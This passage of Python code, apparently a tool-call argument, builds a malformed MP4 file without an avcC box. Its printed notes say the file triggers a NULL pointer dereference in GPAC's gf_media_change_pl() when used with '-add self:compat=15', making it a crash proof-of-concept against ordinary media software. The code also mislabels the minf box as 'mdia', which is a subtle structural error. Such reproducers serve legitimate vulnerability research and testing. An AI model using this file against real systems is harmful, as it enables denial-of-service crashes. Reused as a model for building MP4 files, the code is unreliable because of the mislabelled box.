>h", -1)  # pre_defined\n    # NOTE: We deliberately DO NOT add an avcC box here!\n    # This causes gf_isom_avc_config_get() to return NULL\n    \n    stsd_data += struct.pack(">I", len(avc1_data) + 8)\n    stsd_data += b"avc1"\n    stsd_data += avc1_data\n    \n    stbl_content += struct.pack(">I", len(stsd_data) + 8)\n    stbl_content += b"stsd"\n    stbl_content += stsd_data\n    \n    # stts box (time to sample)\n    stts_data = struct.pack(">I", 0)  # version=0, flags=0\n    stts_data += struct.pack(">I", 1)  # entry_count\n    stts_data += struct.pack(">II", 1, 1000)  # sample_count, sample_delta\n    \n    stbl_content += struct.pack(">I", len(stts_data) + 8)\n    stbl_content += b"stts"\n    stbl_content += stts_data\n    \n    # stsc box (sample to chunk)\n    stsc_data = struct.pack(">I", 0)  # version=0, flags=0\n    stsc_data += struct.pack(">I", 1)  # entry_count\n    stsc_data += struct.pack(">III", 1, 1, 1)  # first_chunk, samples_per_chunk, sample_description_index\n    \n    stbl_content += struct.pack(">I", len(stsc_data) + 8)\n    stbl_content += b"stsc"\n    stbl_content += stsc_data\n    \n    # stsz box (sample size)\n    stsz_data = struct.pack(">I", 0)  # version=0, flags=0\n    stsz_data += struct.pack(">I", 0)  # sample_size (0 means variable)\n    stsz_data += struct.pack(">I", 1)  # sample_count\n    stsz_data += struct.pack(">I", 100)  # entry_size[0]\n    \n    stbl_content += struct.pack(">I", len(stsz_data) + 8)\n    stbl_content += b"stsz"\n    stbl_content += stsz_data\n    \n    # stco box (chunk offset)\n    stco_data = struct.pack(">I", 0)  # version=0, flags=0\n    stco_data += struct.pack(">I", 1)  # entry_count\n    stco_data += struct.pack(">I", 1000)  # chunk_offset[0] (dummy)\n    \n    stbl_content += struct.pack(">I", len(stco_data) + 8)\n    stbl_content += b"stco"\n    stbl_content += stco_data\n    \n    # Write stbl box\n    minf_content += struct.pack(">I", len(stbl_content) + 8)\n    minf_content += b"stbl"\n    minf_content += stbl_content\n    \n    # Write minf box\n    mdia_content += struct.pack(">I", len(minf_content) + 8)\n    mdia_content += b"mdia"\n    mdia_content += minf_content\n    \n    # Write mdia box\n    trak_content += struct.pack(">I", len(mdia_content) + 8)\n    trak_content += b"mdia"\n    trak_content += mdia_content\n    \n    # Write trak box\n    moov_content += struct.pack(">I", len(trak_content) + 8)\n    moov_content += b"trak"\n    moov_content += trak_content\n    \n    # Write moov box\n    write_box(f, "moov", moov_content)\n    \n    # Add dummy mdat box\n    mdat_data = b"\\x00" * 100\n    write_box(f, "mdat", mdat_data)\n\nprint(f"Generated malformed MP4 testcase at: {output_path}")\nprint("This file has an AVC track without avcC configuration box.")\nprint("When used with -add self:compat=15, it will trigger NULL pointer dereference in gf_media_change_pl()")\n'}
